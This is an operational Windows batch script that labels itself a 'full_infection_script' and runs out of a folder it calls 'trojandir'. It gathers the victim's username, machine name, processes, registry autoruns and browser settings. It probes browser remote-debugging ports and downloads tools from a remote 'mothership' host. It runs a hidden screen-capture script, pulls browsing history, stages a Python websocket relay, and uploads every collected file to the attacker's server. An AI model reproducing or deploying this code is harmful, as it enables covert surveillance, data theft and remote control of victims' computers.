REM set by retrieve.php
REM SET jobcode=12345678
REM SET source=cmd_list_screen_capture.bat
REM SET mothership=http://s1083932807.online-home.ca
REM set mothershipassets=https://seashell-raven-793508.hostingersite.com

set /a error_code=0

set sessionid=99%random%%random%%random%%random%%random%
set sessionid=%sessionid:~0,8%
set batchid=%sessionid%

set clientid=xxxxxxxx

SET "trojandir=%temp%\owd"

IF NOT EXIST %trojandir% (
    SET "trojandir=C:\ProgramData\owd"
)

IF NOT EXIST %trojandir% (
    goto :error_owd_folder_missing
)

cd /d %trojandir%

REM %RANDOM% -- 4 digits
set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
SET "timestamp=%tt:~0,14%%tt:~15,4%"
        
md %trojandir%\cmdlist_%timestamp%

cd /d %trojandir%\cmdlist_%timestamp%
    
set workdir=%trojandir%\cmdlist_%timestamp%

set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"


IF EXIST %trojandir%\client_id (
    set /p clientid=<%trojandir%\client_id
)

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)


echo %USERNAME% > %trojandir%\username
SET /P tusername=<%trojandir%\username
set "tusername=%tusername: =%"

IF "%tusername%"=="" (
    wmic computersystem get username | findstr /v UserName > %trojandir%\username
    set /p tusername=<%trojandir%\username
    set "tusername=%tusername:*\=%"
)

echo %COMPUTERNAME% > %trojandir%\machinename
SET /P machinename=<%trojandir%\machinename

set "machinename=%machinename: =%"

IF "%machinename%"=="" (
    wmic computersystem get name | findstr /v Name > %trojandir%\machinename
    SET /P machinename=<%trojandir%\machinename
)

set "machinename=%machinename: =%"

IF "%machinename%"=="" (

    FOR /F "tokens=2 delims=:" %%A IN ('systeminfo ^| findstr /B /C:"Host Name"') DO (
        set "myHost=%%A"
    )
    set "myHost=%myHost:~1%"

    set machinename=%myHost%
    
    echo %machinename% > %trojandir%\machinename
)

set scriptfullpath=%~f0
set source=%~nx0

set params=
set params=%params% --data-urlencode "source=%source%" 
set params=%params% --data-urlencode "sessionid=%sessionid%" 
set params=%params% --data-urlencode "jobcode=%jobcode%" 
set params=%params% --data-urlencode "batchid=%batchid%"
set params=%params% --data-urlencode "username=%tusername%"
set params=%params% --data-urlencode "machinename=%machinename%"
set params=%params% --data-urlencode "clientid=%clientid%"

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=start_job" %params%

REM ---

set msg=setup done
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM --- cleanup

del /f /q %trojandir%\*.log
del /f /q %trojandir%\cmds_log_*.txt

for /d %%g in ( %trojandir%\cmdlist_* ) do ( 
    IF NOT "%%g"=="%workdir%" (
        rmdir /s /q %%g 
    )
)

REM ---

schtasks /v /fo:csv > %workdir%\schtasks_snapshot_init.txt
dir /s %trojandir% > %workdir%\dir_snapshot_trojandir_init.txt
dir /s %USERPROFILE% > %workdir%\dir_sanpshot_userprofile_init.txt

wmic process get CommandLine, ProcessID /format:csv > %workdir%\wmic_snapshot_init.txt
tasklist /v /fo csv > %workdir%\task_snapshot_init.txt
powershell.exe -Command "Get-CimInstance Win32_Process | Select-Object Name, CommandLine, ProcessId | Export-Csv -NoTypeInformation -Path %workdir%\ps1_process_snapshot_init.csv"

curl -o %workdir%\json_rpc_out_9222.json -G http://localhost:9222/json > %workdir%\curl_9222.log 2>&1
curl -o %workdir%\json_rpc_out_9223.json -G http://localhost:9223/json > %workdir%\curl_9223.log 2>&1

REM ---

IF NOT EXIST %trojandir%\handle.exe (
    curl -o %trojandir%\handle.exe %mothership%/ow/assets/handle.exe
)

IF EXIST %trojandir%\handle.exe (
    %trojandir%\handle.exe -v -accepteula > %workdir%\handle.txt 2>&1
)

IF NOT EXIST %trojandir%\BrowsingHistoryView.exe (
    curl -o %trojandir%\BrowsingHistoryView.exe %mothership%/ow/assets/BrowsingHistoryView.exe
)

IF EXIST %trojandir%\BrowsingHistoryView.exe (
    %trojandir%\BrowsingHistoryView.exe /HistorySource 2 /scomma %workdir%\history.csv
)

REM ---

dir /s "%ProgramData%\Microsoft\Windows\Start Menu\Programs" > %workdir%\dir_start_menu_programs.txt
dir /s "%appdata%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" > %workdir%\quick_launch.txt

set regpath=HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query "%regpath%" > %workdir%\reg_query_1.txt
Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" > %workdir%\reg_query_1_ps.txt

set regpath=HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command
reg query %regpath% > %workdir%\reg_query_2.txt
Get-ItemProperty -Path "Registry::HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command" > %workdir%\reg_query_2_ps.txt

set regpath=HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command
reg query %regpath% > %workdir%\reg_query_3.txt
Get-ItemProperty -Path "Registry::HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command" > %workdir%\reg_query_3_ps.txt

REM ---

goto :skip01238
wmic OS GET LocalDateTime | findstr /v "^$" | findstr /v "LocalDateTime" > %workdir%\wmic_check.txt
query user > %workdir%\user_query.txt
getmac /v /fo csv | findstr /v 00 | findstr /v Connection > %workdir%\macaddr.csv
systeminfo > %workdir%\systeminfo.txt
ipconfig /all > %workdir%\ipconfig.txt

set "key=HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
set "val=ProgId"

echo ChromeHTML > %workdir%\reg_query_browser.txt
reg query "%key%" /v "%val%" | findstr /i "ChromeHTML" >> %workdir%\reg_query_browser.txt 2>&1

echo IE.Assoc >> %workdir%\reg_query_browser.txt
reg query "%key%" /v "%val%" | findstr /i "IE.Assoc" >> %workdir%\reg_query_browser.txt 2>&1
:skip01238

REM --- compare trojan MD5

type nul > %workdir%\old_zfei.md5
certUtil -hashfile %trojandir%\zfei.vbs MD5 | more +1 > %workdir%\old_zfei.md5
set /p old_zfei_md5=<%workdir%\old_zfei.md5

del /F /Q %trojandir%\zfei_upgrade.vbs

curl -o %trojandir%\zfei_upgrade.vbs -G %mothership%/ow/assets/zfei.vbs

IF EXIST %trojandir%\zfei_upgrade.vbs (
    type nul > %workdir%\new_zfei.md5
    certUtil -hashfile %trojandir%\zfei_upgrade.vbs MD5 | more +1 > %workdir%\new_zfei.md5
    set /p new_zfei_md5=<%workdir%\zfei_upgrade.md5
)

set script_version="full_infection_script"
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=update_snapshot" --data-urlencode "old_zfei_md5=%old_zfei_md5%" --data-urlencode "new_zfei_md5=%new_zfei_md5%" --data-urlencode "script_version=%script_version%" %params%

REM ---

curl -o %trojandir%\modify_edge_lnk.ps1 -G %mothershipassets%/ow/assets/modify_edge_lnk.ps1

IF EXIST %trojandir%\modify_edge_lnk.ps1 (
REM    powershell.exe -ExecutionPolicy Bypass -File %trojandir%\modify_edge_lnk.ps1 > %workdir%\modify_edge_lnk.ps1.log 2>&1
)

REM taskkill /F /IM msedge.exe
REM start msedge --remote-debugging-port=9222 --profile-directory=Default --remote-allow-origins=^* --restore-last-session --flag-switches-begin --enable-features=msEdgeDevToolsWdpRemoteDebugging --flag-switches-end

REM --- start relay

REM ! TODO: put in code to kill relay if it is running


set pythondir=
IF EXIST %trojandir%\python_path (
    set /p pythondir=<%trojandir%\python_path
)

IF "%pythondir%"=="" (
    set pythondir=%trojandir%\python\work\Portable Python-3.10.5 x64\App\Python
)

set relaypath=%trojandir%\relay
mkdir %relaypath%
cd /d %relaypath%

del /F /Q %relaypath%\*

curl -o %relaypath%\relay.py -G %mothershipassets%/ow/assets/relay
curl -o %relaypath%\start_relay.vbs -G %mothershipassets%/ow/assets/start_relay.vbs

"%pythondir%"\python.exe --version > %workdir%\python_version

"%pythondir%"\python.exe -m pip install --upgrade pip > %workdir%\python_pip_upgrade.log 2>&1
"%pythondir%"\python.exe -m pip install psutil > %workdir%\python_pip_psutil.log 2>&1
"%pythondir%"\python.exe -m pip install websocket-client > %workdir%\python_pip_websocket-client.log 2>&1

IF EXIST %relaypath%\start_relay.vbs (
REM start "" /min wscript.exe /b %relaypath%\start_relay.vbs > %workdir%\start_relay.vbs_cmd.log 2>&1
)

REM ----

REM schtasks /query /v /fo:csv > %workdir%\schtasks_snapshot_final.txt
dir /s %trojandir% > %workdir%\dir_snapshot_final.txt
wmic process get CommandLine, ProcessID /format:csv > %workdir%\wmic_snapshot_final.txt
tasklist /v /fo csv > %workdir%\task_snapshot_final.txt
powershell.exe -Command "Get-CimInstance Win32_Process | Select-Object Name, CommandLine, ProcessId | Export-Csv -NoTypeInformation -Path %workdir%\ps1_process_snapshot_final.csv"

REM ---

curl -o %trojandir%\get_full_screen_capture.ps1 -G %mothership%/ow/assets/get_full_screen_capture.ps1
IF EXIST %trojandir%\get_full_screen_capture.ps1 (
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %trojandir%\get_full_screen_capture.ps1 %workdir%
)

IF NOT EXIST %trojandir%\nircmdc.exe (
    curl -o %trojandir%\nircmdc.exe -G %mothership%/ow/assets/nircmd.exe
)

IF EXIST %trojandir%\nircmdc.exe (
    start "" /min %trojandir%\nircmdc.exe savescreenshot %workdir%\nircmd_screenshot.png
)

REM ---------- upload artifacts

set msg=starting uploadfiles
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM ----

copy /y %trojandir%\bbti.bat_cmds.log %workdir%

cd /d %workdir%

FOR %%F IN ("*") DO (
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=uploading %%F" %params%

    curl -X POST --data-binary "@%%F" %mothership%/ow/upload.php?batchid=%batchid%^&filename=%%F^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%^&machinename=%machinename%^&username=%username%^&jobcode=%jobcode%
)

REM ---

:finished
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished" %params%

exit

:error_relay_script_missing
set /a error_code+=1
:error_python_exe_missing
set /a error_code+=1
:error_RunHiddenPSx_missing
set /a error_code+=1
:error_full_screen_capture_missing
set /a error_code+=1
:error_full_screen_capture_empty
set /a error_code+=1
:error_retrieve_get_macaddr_failed
set /a error_code+=1
:error_upgrade_download_failed
set /a error_code+=1
:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1
:error_python_folder_missing
set /a error_code+=1

copy /y %trojandir%\bbti.bat_cmds.log %workdir%
set fname=bbti.bat_cmds.log
set fpath=%workdir%\%fname%
curl -X POST --data-binary "@%fpath%" %mothership%/ow/upload.php?batchid=%batchid%^&filename=%fname%^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%^&machinename=%machinename%^&username=%username%^&jobcode=%jobcode%

set msg=errors occurred while executing error_code %error_code%
curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%" %params%

exit
